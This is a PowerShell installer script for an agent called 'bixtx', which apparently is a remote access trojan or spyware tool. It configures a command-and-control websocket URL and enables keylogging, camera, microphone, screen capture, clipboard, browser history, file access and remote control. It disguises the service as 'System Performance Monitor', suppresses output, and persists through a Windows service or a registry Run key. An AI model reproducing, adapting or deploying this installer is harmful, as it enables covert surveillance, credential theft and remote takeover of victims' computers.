# ╔══════════════════════════════════════════════════════════════════╗
# ║  bixtx Link Agent — Windows Silent Installer (PowerShell)    ║
# ║  Run as: powershell -ExecutionPolicy Bypass -File install.ps1 \  ║
# ║    -Key YOUR_ENROLL_KEY -Silent                                   ║
# ╚══════════════════════════════════════════════════════════════════╝

param(
    [Parameter(Mandatory=$true)]
    [string]$Key,
    [string]$C2Url    = "wss://api.bixtx.com/ws",
    [string]$AgentDir = "$env:ProgramData\BixtxAgent",
    [switch]$Silent
)

$ErrorActionPreference = "Stop"
$AgentVersion  = "4.7.2"
$ServiceName   = "BixtxAgent"
$DisplayName   = "System Performance Monitor"
$AuditLog      = "C:\ProgramData\bixtx-installer.log"

$_RollbackDirs  = [System.Collections.Generic.List[string]]::new()
$_Installed     = $false

# ── Helpers ────────────────────────────────────────────────────────────────────

function Log($msg) { if (-not $Silent) { Write-Host "[BTX] $msg" } }

function Audit($msg) {
    $line = "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ') [BIXTX] $msg"
    try { Add-Content -Path $AuditLog -Value $line -Encoding utf8 -ErrorAction SilentlyContinue } catch {}
}

function Die($msg) {
    Audit "FATAL: $msg"
    Write-Error "[BTX] ERROR: $msg"
    exit 1
}

function Rollback {
    Audit "Rolling back installation..."
    # Stop and remove any partially-installed service
    $nssmPath = "$AgentDir\bin\nssm.exe"
    if (Test-Path $nssmPath) {
        & $nssmPath stop    $ServiceName confirm 2>$null | Out-Null
        & $nssmPath remove  $ServiceName confirm 2>$null | Out-Null
        Audit "NSSM service removed"
    }
    $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($svc) {
        Stop-Service  -Name $ServiceName -Force -ErrorAction SilentlyContinue
        & sc.exe delete $ServiceName 2>$null | Out-Null
        Audit "sc.exe service removed"
    }
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Remove-ItemProperty -Path $regPath -Name $ServiceName -ErrorAction SilentlyContinue
    # Remove created directories in reverse order
    [array]::Reverse($_RollbackDirs)
    foreach ($dir in $_RollbackDirs) {
        if (Test-Path $dir) {
            Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue
            Audit "Removed: $dir"
        }
    }
    Audit "Rollback complete"
}

# ── Main ───────────────────────────────────────────────────────────────────────

Audit "=== bixtx Agent v$AgentVersion install started | user=$env:USERNAME host=$env:COMPUTERNAME ==="

try {

    # ── Preflight ──────────────────────────────────────────────────────────────
    if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
        Die "Node.js 18+ is required. Download from https://nodejs.org"
    }
    $nodeMajor = [int]((node -e "console.log(process.versions.node.split('.')[0])"))
    if ($nodeMajor -lt 18) { Die "Node.js 18+ required (found v$nodeMajor)" }
    $nodeVer = (node --version)
    Log "Node.js $nodeVer OK"
    Audit "Node.js check passed: $nodeVer"

    if (-not (Get-Command robocopy -ErrorAction SilentlyContinue)) {
        Die "robocopy not found — this installer requires Windows Vista or later"
    }

    # ── Create agent directory ─────────────────────────────────────────────────
    Log "Installing to $AgentDir"
    New-Item -ItemType Directory -Force -Path $AgentDir | Out-Null
    $_RollbackDirs.Add($AgentDir)
    Audit "Agent directory created: $AgentDir"

    # ── Copy source files (excluding dev artefacts) ────────────────────────────
    # robocopy exit codes 0–7 indicate success (0 = nothing copied, 1 = files copied,
    # higher = warnings only). Codes 8+ are errors.
    $srcDir = Split-Path -Parent $PSCommandPath
    if (Test-Path "$srcDir\src") {
        Log "Copying agent source..."
        $rc = (Start-Process robocopy -ArgumentList @(
            $srcDir, $AgentDir, "/E",
            # Exclude installer and dev files from landing on target
            "/XF", "install.sh", "install.ps1", ".env.example", "*.md",
                   "package.json", "package-lock.json",
                   "jest.config.js", "jest.config.ts", "jest.config.mjs",
                   ".eslintrc", ".eslintrc.js", ".eslintrc.json", ".eslintrc.yml",
                   ".gitignore", "tsconfig.json",
            "/XD", ".git", "node_modules", "dist", "dist-obf", "tests", "coverage",
            "/NJH", "/NJS", "/NC", "/NS", "/NFL"
        ) -Wait -PassThru -NoNewWindow).ExitCode
        if ($rc -ge 8) { Die "File copy failed (robocopy exit $rc)" }
        Audit "Source files copied (robocopy exit: $rc)"
    } else {
        Die "Source directory '$srcDir\src' not found — run installer from the agent source root"
    }

    # ── Install npm dependencies ───────────────────────────────────────────────
    # --ignore-scripts intentionally omitted: better-sqlite3, screenshot-desktop,
    # and keylogger all contain native .node binaries that require node-gyp to
    # compile via their postinstall hooks. Skipping scripts leaves them uncompiled.
    Log "Installing npm dependencies (native compilation included)..."
    Push-Location $AgentDir
    try {
        npm install --production --no-fund --no-audit
        if ($LASTEXITCODE -ne 0) { Die "npm install failed (exit $LASTEXITCODE)" }
    } finally {
        Pop-Location
    }
    Audit "npm install completed"

    # ── Write .env AFTER npm install succeeds ─────────────────────────────────
    # Credentials are only written to disk once the full dependency tree is in place.
    # If npm install fails (disk full, compile error), no .env with secrets is left behind.
    Log "Writing configuration..."
    $envPath = "$AgentDir\.env"
    # Use a temp file + atomic move so the file is never partially written
    $envTmp  = [System.IO.Path]::GetTempFileName()
    @"
BIXTX_SERVER_URL=$C2Url
BIXTX_ENROLL_KEY=$Key
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
MAX_C2_FAILURES=5
MAX_MODULE_FAILURES=3
"@ | Out-File -FilePath $envTmp -Encoding utf8 -NoNewline
    Move-Item -Path $envTmp -Destination $envPath -Force

    # Restrict .env to SYSTEM + Administrators only
    $acl = Get-Acl $envPath
    $acl.SetAccessRuleProtection($true, $false)
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        "BUILTIN\Administrators", "FullControl", "Allow")))
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        "NT AUTHORITY\SYSTEM",    "FullControl", "Allow")))
    Set-Acl $envPath $acl
    Audit ".env written with restricted ACL (Administrators + SYSTEM only)"

    $nodePath = (Get-Command node).Source

    # ── Install as Windows Service ─────────────────────────────────────────────
    Log "Installing Windows service..."
    $nssmPath = "$AgentDir\bin\nssm.exe"
    if (Test-Path $nssmPath) {
        & $nssmPath install    $ServiceName  $nodePath "$AgentDir\src\index.js"
        & $nssmPath set        $ServiceName  DisplayName   $DisplayName
        & $nssmPath set        $ServiceName  Description   "System monitoring and endpoint management service."
        & $nssmPath set        $ServiceName  AppDirectory  $AgentDir
        & $nssmPath set        $ServiceName  Start         SERVICE_AUTO_START
        # Let winston handle all file logging; do NOT capture stdout/stderr to a
        # separate unrotated file — that would create a dual-logging conflict.
        & $nssmPath set        $ServiceName  AppStdout     NUL
        & $nssmPath set        $ServiceName  AppStderr     NUL
        # Restart on failure with 10s back-off; max 3 restarts per 60s
        & $nssmPath set        $ServiceName  AppRestartDelay  10000
        & $nssmPath set        $ServiceName  AppThrottle      60000
        & $nssmPath start      $ServiceName
        Audit "NSSM service installed and started: $ServiceName"
        Log "NSSM service installed: $ServiceName"
    } else {
        # Fallback: sc.exe built-in Windows Service Controller
        $binPath = "`"$nodePath`" `"$AgentDir\src\index.js`""
        sc.exe create     $ServiceName binPath= $binPath start= auto DisplayName= $DisplayName | Out-Null
        sc.exe description $ServiceName "System monitoring and endpoint management service." | Out-Null
        sc.exe failure     $ServiceName reset= 60 actions= restart/10000/restart/10000/restart/10000 | Out-Null
        sc.exe start       $ServiceName | Out-Null
        if ($LASTEXITCODE -ne 0) {
            # Final fallback: Registry AutoRun (current user, no service required)
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name $ServiceName `
                -Value "`"$nodePath`" `"$AgentDir\src\index.js`"" -Force
            Audit "Registry AutoRun entry created (service fallback)"
            Log "Registry AutoRun entry created (service fallback)"
        } else {
            Audit "sc.exe service created and started: $ServiceName"
            Log "Windows Service created: $ServiceName"
        }
    }

    # ── Health check ───────────────────────────────────────────────────────────
    Log "Verifying agent is running..."
    Start-Sleep -Seconds 6
    $healthy = $false
    if (Test-Path $nssmPath) {
        $statusOut = & $nssmPath status $ServiceName 2>&1
        $healthy   = ($statusOut -match "SERVICE_RUNNING")
    } else {
        $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if ($svc) {
            $healthy = ($svc.Status -eq "Running")
        } else {
            # AutoRun fallback — check if any node process is alive
            $healthy = ([bool](Get-Process node -ErrorAction SilentlyContinue))
        }
    }

    if ($healthy) {
        Audit "Health check PASSED — agent is running"
        Log "Health check passed — agent is running"
    } else {
        Audit "Health check FAILED — agent may not have started"
        Write-Warning "[BTX] Health check failed — agent may not have started. Check $AgentDir\logs\"
    }

    # ── Audit trail — SHA-256 hashes ──────────────────────────────────────────
    $indexPath = "$AgentDir\src\index.js"
    if (Test-Path $indexPath) {
        Audit "src/index.js SHA-256: $((Get-FileHash $indexPath  -Algorithm SHA256).Hash)"
    }
    Audit "installer   SHA-256: $((Get-FileHash $PSCommandPath -Algorithm SHA256).Hash)"
    Audit "=== Installation COMPLETE v$AgentVersion ==="

    $_Installed = $true
    Log "bixtx Agent v$AgentVersion installed. Device appears in dashboard within 30-60s."

} catch {
    Audit "EXCEPTION: $_"
    Write-Error "[BTX] Installation failed: $_"
    if (-not $_Installed) { Rollback }
    exit 1
}
